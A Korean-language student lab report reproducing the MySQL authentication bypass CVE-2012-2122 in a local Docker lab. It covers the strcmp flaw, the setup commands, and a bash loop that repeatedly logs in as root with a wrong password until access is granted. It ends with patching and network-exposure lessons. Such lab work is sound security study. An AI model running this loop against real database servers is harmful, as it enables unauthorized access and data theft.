# CVE-2012-2122 실습 보고서

- 이름: 남윤화
- 날짜: 2025-04-10
- 취약점명: MySQL 인증 우회 취약점 (CVE-2012-2122)
- 실습 환경: Docker + kr-vulhub
- GitHub 레포: (https://github.com/SouthYun/kr-vulhub)

---

## 1. 개요

CVE-2012-2122는 MySQL 5.5.23 이하 버전에서 발생하는 인증 우회 취약점입니다.  
잘못된 비밀번호를 여러 번 입력할 경우, 낮은 확률로 인증이 우회되며 로그인에 성공할 수 있습니다.  
이는 MySQL 내부의 암호 비교 함수의 버그로 인해 발생합니다.

### 1.1 MySQL이란
MySQL은 오픈 소스 관계형 데이터베이스로, 데이터를 표로 저장하고 관리하는 프로그램입니다. 많은 웹 서비스에서 사용자 정보나 게시글을 저장할 때 사용합니다. 

### 1.2 정상적 MySQL
사용자가 Id, Pw 입력 -> 서버가 암호화된 해시로 비교 -> 일치하면 로그인 성공

### 1.3 인증 우회 취약점
내부적으로 strcmp() 함수를 써서 비교하던 중, 암호가 맞지 않아도 특정 시점에서는 이를 같다고 잘못 판단하는 경우가 발생함.
이는 1/256 확률로 발생.

만일 root계정으로 인증이 우회되면 DB를 전부 빼내갈 수 있으므로 이는 매우 위험함.
---

## 2. 실습 환경 구성

### 2.1 kr-vulhub 클론

```
git clone https://github.com/SouthYun/kr-vulhub
cd kr-vulhub/MySQL/CVE-2012-2122
```

### 2.2 Docker 환경 실행
docker-compose up -d
정상적으로 컨테이너가 실행되었는지 확인합니다.


## 3. 취약점 재현
### 3.1 무한 루프 로그인 시도
취약한 서버에 비밀번호가 틀린 상태로 계속 로그인을 시도합니다.

```
while true; do mysql -u root -pwrongpassword -h 127.0.0.1; done
```
위위 명령어는 잘못된 비밀번호를 반복적으로 시도하여, 낮은 확률로 인증 우회가 발생하는지를 실험합니다.

### 3.2 로그인 우회 성공
일정 횟수 반복 후, 아래와 같이 root 권한으로 로그인에 성공합니다.

```
Welcome to the MySQL monitor.
Your MySQL connection id is 660
Server version: 5.5.23 Source distribution
```
아래는 인증 우회가 성공한 화면입니다.
[인증 우회 성공 스크린샷](login-bypass-success.png)


## 4. 요약 및 느낀 점
실제로 취약한 MySQL 버전에서는 비밀번호가 틀려도 인증이 우회되는 사례가 발생함을 확인했습니다.

이를 통해  공격자가 root를 포함한 특정 사용자 계정에 로그인해 허용되지 않은 권한의 기능을 수행하고 정보를 얻을 수 있음을 알게 되었습니다.

이를 방지하기 위해 주기적인 보안 업데이트가 중요하며, DB 서버의 네트워크가 노출되지 않도록 노력해야 함을 알게 되었습니다.

